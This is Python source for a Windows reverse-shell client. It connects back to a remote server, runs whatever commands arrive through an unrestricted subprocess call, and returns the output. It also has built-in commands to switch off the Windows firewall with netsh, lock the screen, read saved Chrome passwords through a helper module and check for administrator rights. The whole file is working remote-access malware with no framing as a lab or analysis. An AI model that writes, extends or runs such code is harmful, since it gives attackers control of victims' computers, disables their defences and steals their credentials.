import os
import socket
import subprocess
import ctypes
import cp


class Shell:
    """
    Gets a simple reverse shell back to host
    """

    def __init__(self, sock: socket) -> None:
        """
        Constructor

        :param sock: The socket to send the data through
        """
        self.sock = sock

    def get_shell(self) -> None:
        """
        Executes received commands from the server and sends the output back through the socket
        """
        check_admin_flag = False
        while 1:  # Infinite loop
            try:
                # Gets cwd and sends to server
                self.sock.send(str.encode(os.getcwd() + "# "))

                # Receives messages from server
                data = self.sock.recv(1024).decode("UTF-8")
                data = data.strip('\n')

                # Special cases

                # Exits shell
                if data == "quit" or data == "exit":
                    break

                # Changes directory
                if data[:2] == "cd":
                    os.chdir(data[3:])

                # Lists cwd with ls
                if data == "ls":
                    data = "dir"

                # Disables/enables firewall
                if data == "firewall off":
                    data = "netsh advfirewall set currentprofile state off"
                if data == "firewall on":
                    data = "netsh advfirewall set currentprofile state on"

                # Locks the screen of client
                if data == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    data = "echo Screen locked"
                
                # Gets all chrome passwords
                if data == "get chrome pass":
                    data = "echo " + cp.get_chrome_pass()
                    # cp.get_chrome_pass()
                    
                # Checks if client has admin rights
                if data == "check admin":
                    check_admin_flag = True
                    data = "echo %ERRORLEVEL%"

                if len(data) > 0:
                    # Executes arbitrary command
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    
                    # To check if user has admin privileges
                    if check_admin_flag:
                        if output_str == "0":
                            output_str = "You ARE an administrator"
                        else:
                            output_str = "You are NOT an administrator"
                        
                        # Reset flag
                        check_admin_flag = False

                    # Sends output back to server
                    self.sock.send(str.encode("\n" + output_str))

            except socket.error:
                continue

    


